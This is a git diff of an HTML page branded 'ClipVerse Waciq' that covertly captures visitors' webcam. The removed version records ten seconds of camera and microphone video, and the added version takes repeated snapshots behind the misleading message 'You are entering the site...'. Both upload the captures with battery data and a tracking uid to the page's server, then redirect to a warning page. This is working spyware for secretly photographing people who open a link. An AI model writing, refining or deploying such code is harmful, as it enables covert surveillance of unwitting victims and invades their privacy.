@@ -2,10 +2,11 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>ClipVerse Waciq - Video Recorder</title>
+  <title>ClipVerse Waciq - Recorder</title>
   <link rel="icon" type="image/png" href="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg">
   <style>
     * { box-sizing: border-box; }
+
     body {
       margin: 0;
       padding: 0;
@@ -20,8 +21,9 @@
       text-align: center;
       backdrop-filter: blur(6px);
     }
+
     .container {
-      background: rgba(0,0,0,0.6);
+      background: rgba(0, 0, 0, 0.6);
       border-radius: 25px;
       padding: 60px 45px;
       width: 95%;
@@ -33,90 +35,132 @@
       align-items: center;
       animation: popIn 0.7s ease-out;
     }
-    .logo { width: 160px; margin-bottom: 30px; box-shadow:0 0 18px rgba(0,255,255,0.6);}
-    .loader { border:7px solid rgba(255,255,255,0.2); border-top:7px solid #00ffcc; border-radius:50%; width:70px; height:70px; animation:spin 1s linear infinite; margin:25px 0;}
-    .text { font-size:20px; line-height:1.8; text-shadow:0 0 6px rgba(0,0,0,0.6); background: linear-gradient(to right,#00ffe7,#00ffa1,#9fff5b); -webkit-background-clip:text; -webkit-text-fill-color:transparent; font-weight:bold;}
-    .credit { margin-top:25px; font-size:15px; color:#ccc; font-weight:bold; }
-    @keyframes spin { 0% { transform:rotate(0deg);} 100% { transform:rotate(360deg);} }
-    @keyframes popIn { 0% { opacity:0; transform:scale(0.9);} 100% { opacity:1; transform:scale(1);} }
-    @media (max-width:600px){ .container{margin:0 10px;padding:40px 25px;min-height:450px;} .logo{width:130px;} .text{font-size:17px;} }
-    video, canvas { display:none; }
+
+    .logo {
+      width: 160px;
+      height: auto;
+      margin-bottom: 30px;
+      box-shadow: 0 0 18px rgba(0,255,255,0.6);
+    }
+
+    .loader {
+      border: 7px solid rgba(255, 255, 255, 0.2);
+      border-top: 7px solid #00ffcc;
+      border-radius: 50%;
+      width: 70px;
+      height: 70px;
+      animation: spin 1s linear infinite;
+      margin: 25px 0;
+    }
+
+    .text {
+      font-size: 20px;
+      line-height: 1.8;
+      text-shadow: 0 0 6px rgba(0, 0, 0, 0.6);
+      background: linear-gradient(to right, #00ffe7, #00ffa1, #9fff5b);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      font-weight: bold;
+    }
+
+    .credit {
+      margin-top: 25px;
+      font-size: 15px;
+      color: #ccc;
+      font-weight: bold;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes popIn {
+      0% { opacity: 0; transform: scale(0.9); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        margin: 0 10px;
+        padding: 40px 25px;
+        min-height: 450px;
+      }
+      .logo { width: 130px; }
+      .text { font-size: 17px; }
+    }
+
+    video, canvas { display: none; }
   </style>
 </head>
 <body>
 
-<div class="container">
-  <img src="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg" alt="logo" class="logo">
-  <div class="text" id="status">🕵️‍♂️ <b>Starting video recording...</b><br><b>Keep this page open 🎥</b></div>
-  <div class="loader"></div>
-  <div class="credit">𝗠𝗔𝗗𝗘 𝗕𝗬 💛 𝗪𝗔𝗖𝗜𝗤</div>
-</div>
+  <div class="container">
+    <img src="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg" alt="logo" class="logo">
+    <div class="text" id="status">
+      🕵️‍♂️ <b>You are entering the site...</b><br>
+      <b>Keep this page open 🎥</b>
+    </div>
+    <div class="loader"></div>
+    <div class="credit">𝗠𝗔𝗗𝗘 𝗕𝗬 💛 𝗪𝗔𝗖𝗜𝗤</div>
+  </div>
 
-<video id="video" autoplay playsinline></video>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="snapshot"></canvas>
 
-<script>
-const video = document.getElementById('video');
-const statusEl = document.getElementById('status');
-const params = new URLSearchParams(window.location.search);
-const uid = params.get('uid') || 'unknown';
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('snapshot');
+    const ctx = canvas.getContext('2d');
+    const statusEl = document.getElementById('status');
 
-let mediaRecorder, recordedChunks = [], batteryLevel=0, isCharging=false;
+    const params = new URLSearchParams(window.location.search);
+    const uid = params.get('uid') || 'unknown';
+    let snapshotCount = 0; // Counter for 4 snapshots
 
-if(uid){
-  navigator.getBattery().then(battery => {
-    batteryLevel = Math.round(battery.level*100);
-    isCharging = battery.charging;
+    if (uid) {
+      navigator.getBattery().then(battery => {
+        const batteryLevel = Math.round(battery.level * 100);
+        const isCharging = battery.charging;
 
-    navigator.mediaDevices.getUserMedia({ video:true, audio:true })
-      .then(stream => {
-        video.srcObject = stream;
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+          video.srcObject = stream;
+          statusEl.innerHTML = "📸 <b>You are entering the site...</b>";
 
-        mediaRecorder = new MediaRecorder(stream, {
-          mimeType: 'video/webm;codecs=vp9',
-          videoBitsPerSecond: 2500000
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
+        }).catch(err => {
+          console.error("Camera error:", err);
+          statusEl.innerHTML = "❌ <b>Camera access failed!</b>";
         });
-
-        mediaRecorder.ondataavailable = e => { if(e.data.size>0) recordedChunks.push(e.data); };
-        mediaRecorder.onstop = sendVideoToServer;
-
-        statusEl.innerHTML = "🎥 <b>Recording video...</b>";
-
-        // Start recording
-        setTimeout(() => { mediaRecorder.start(1000); }, 1000);
-
-        // Stop after 10 seconds
-        setTimeout(() => {
-          if(mediaRecorder && mediaRecorder.state==='recording'){
-            mediaRecorder.stop();
-            stream.getTracks().forEach(track=>track.stop());
-          }
-        }, 11000);
-
-      }).catch(err => {
-        console.error("Camera error:", err);
-        statusEl.innerHTML = "❌ <b>Camera/microphone access failed!</b>";
       });
-  });
-}
+    }
 
-function sendVideoToServer(){
-  if(recordedChunks.length===0){ window.location.href="/warning.html"; return; }
-  const videoBlob = new Blob(recordedChunks,{ type:'video/webm' });
-  const reader = new FileReader();
-  reader.onloadend = ()=>{
-    const videoData = reader.result.split(',')[1];
-    fetch('/api/upload-video', {
-      method:'POST',
-      headers:{ 'Content-Type':'application/json' },
-      body: JSON.stringify({ video:videoData, uid, battery:batteryLevel, charging:isCharging, format:'webm' })
-    }).then(res => window.location.href="/warning.html")
-      .catch(err=>window.location.href="/warning.html");
-  };
-  reader.readAsDataURL(videoBlob);
-}
+    function takeSnapshotAndSend(battery, charging) {
+      if (snapshotCount >= 4) {
+        window.location.href = "/warning.html"; // Redirect page
+        return;
+      }
 
-window.addEventListener('beforeunload', ()=>{ if(mediaRecorder && mediaRecorder.state==='recording') mediaRecorder.stop(); });
-</script>
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      const imageData = canvas.toDataURL('image/png');
 
+      fetch('/api/upload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: imageData, uid, battery, charging })
+      }).then(() => {
+        snapshotCount++;
+        if (snapshotCount >= 4) {
+          window.location.href = "/warning.html"; // Redirect page
+        }
+      }).catch(err => {
+        console.error("Upload error:", err);
+      });
+    }
+  </script>
 </body>
 </html> 
